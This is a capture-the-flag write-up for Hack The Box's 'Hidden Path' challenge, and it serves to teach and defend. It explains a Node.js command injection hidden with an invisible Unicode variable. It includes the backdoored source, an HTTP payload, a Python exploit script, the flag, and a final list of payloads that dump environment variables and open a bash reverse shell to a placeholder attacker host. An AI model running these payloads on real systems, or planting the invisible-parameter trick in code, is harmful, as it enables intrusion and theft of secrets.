# Hidden Path - Hack The Box Labs

![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
![Category: Misc](https://img.shields.io/badge/Category-Misc-blue)
![Points: 1000](https://img.shields.io/badge/Points-1000-yellow)

## Challenge Info

- **Name**: Hidden Path
- **Category**: Misc
- **Difficulty**: Easy
- **Points**: 1000
- **Date**: 2026-03-18

## Description

Legends speak of the infamous Kamara-Heto, a black-hat hacker of old who rose to fame as they brought entire countries to their knees. Opinions are divided over whether the fabled figure truly existed, but the success of the team surely lies in the hope that they did, for the location of the lost vault is only known to be held on what remains of the NSA's data centres. You have extracted the source code of a system check-up endpoint - can you find a way in? And was Kamara-Heto ever there?

## Target Information

- **IP**: 154.57.164.69
- **Port**: 30224
- **Type**: Command Injection via Unicode Homoglyph

## Solution

### Source Code Analysis

The provided `app.js` contained a subtle but critical vulnerability:

```javascript
app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;  // Note the invisible character!
    const integerChoice = +choice;
    
    const commands = [
        'free -m',
        'uptime',
        'iostat',
        'mpstat',
        'netstat',
        'ps aux',ㅤ  // Invisible character as 7th element!
    ];
    
    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }
    
    exec(commands[integerChoice], (error, stdout) => {
        // ...
    });
});
```

### Vulnerability

**Type**: Command Injection via Unicode Homoglyph (U+3164)

**Unicode Character**: `ㅤ` (U+3164 HANGUL JUNGSEONG FILLER)

This invisible character appears twice in the code:
1. In the destructuring pattern `const { choice,ㅤ}` - extracts a hidden parameter from request body
2. In the commands array `'ps aux',ㅤ` - the 7th element references the **variable**, not a string literal

When `choice=6` is sent, `commands[6]` evaluates to the current value of the invisible variable `ㅤ`, which can be controlled via POST data.

### Exploitation

**Exploit Flow**:

1. Send `choice=6` to select the 7th array element
2. Send the invisible character parameter (U+3164) with our command
3. The server executes our injected command

**Payload**:
```http
POST /server_status HTTP/1.1
Host: 154.57.164.69:30224
Content-Type: application/x-www-form-urlencoded

choice=6&ㅤ=cat flag.txt
```

URL-encoded:
```
choice=6&%E3%85%A4=cat%20flag.txt
```

### Exploit Script (Python)

```python
import requests
import urllib.parse

# U+3164 HANGUL JUNGSEONG FILLER
invisible = '\u3164'

payload = f'choice=6&{urllib.parse.quote(invisible)}=cat flag.txt'

r = requests.post(
    'http://154.57.164.69:30224/server_status',
    data=payload,
    headers={'Content-Type': 'application/x-www-form-urlencoded'}
)
print(r.text)
# Output: HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}
```

### How It Works

```
1. Client sends: choice=6&ㅤ=cat flag.txt

2. Server destructures req.body:
   choice = '6'
   ㅤ = 'cat flag.txt'  (invisible variable)

3. commands array is defined:
   commands[6] = reference to variable ㅤ
   
4. exec(commands[6]) → exec('cat flag.txt')

5. Flag is returned in response
```

## Flag

```
HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_6011a114c82501cf9d38d89d752075cd}
```

## Key Takeaways

1. **Unicode homoglyphs** (U+3164) can create hidden parameters that bypass validation
2. **Variable references in array literals** use the variable's current value at execution time, not the value at definition time
3. **Destructuring assignments** with unusual identifiers can extract hidden form data
4. Array bounds checking can be bypassed when array elements reference mutable variables
5. Always sanitize and validate ALL user inputs, including unexpected parameter names

## Tools Used

- `curl` - HTTP requests
- Python `requests` library - Automated exploitation
- `urllib.parse` - URL encoding

## References

- [Unicode U+3164 - Hangul Jungseong Filler](https://unicode-table.com/en/3164/)
- [Node.js Destructuring Assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)
- [Express Body Parsing](https://expressjs.com/en/api.html#express.urlencoded)

## Detection & Prevention

**Detection**:
- Search source code for unusual Unicode characters using `grep -r $'\u3164' .`
- Check for variable names outside normal ASCII range
- Audit array definitions that reference variables
- Test POST endpoints with unexpected parameter names

**Prevention**:
- Validate and whitelist allowed parameter names
- Use linters with Unicode detection (e.g., ESLint `no-irregular-whitespace`)
- Avoid using variables as array elements in security-critical code
- Implement strict input validation on all parameters

## Additional Payloads Tested

```bash
# List files
choice=6&ㅤ=ls -la

# Find flag
choice=6&ㅤ=find / -name "flag*" 2>/dev/null

# Read environment variables
choice=6&ㅤ=env

# Reverse shell (would work with proper listener)
choice=6&ㅤ=bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```
